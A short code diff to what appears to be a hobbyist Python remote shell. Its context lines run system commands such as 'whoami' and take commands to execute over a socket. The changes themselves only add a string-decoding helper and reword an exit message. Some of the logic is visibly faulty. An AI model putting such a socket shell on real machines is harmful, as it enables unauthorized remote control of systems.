@@ -19,6 +19,9 @@ def execute_cmd(cmd):
 
 print(execute_cmd("whoami").decode())
 
+def decode_and_strip(s):
+    return s.decode("utf-8").strip()
+
 def shell_thread(sock):
     try:
         sock.send(f": ENTER COMMANDS TO EXECUTE : LocalIP_OF_Machine:[{IP}]") #I think im getting the hang outta this.
@@ -31,7 +34,7 @@ def shell_thread(sock):
                 buffer = data.decode()
 
                 if not buffer or buffer == "exit":
-                    print("Exit: Trallalelo Tralala")
+                    print("Exiting: ")
             if KeyboardInterrupt:
                 print(b"Keyboard Interrupt: Exiting\r\n")
                 break
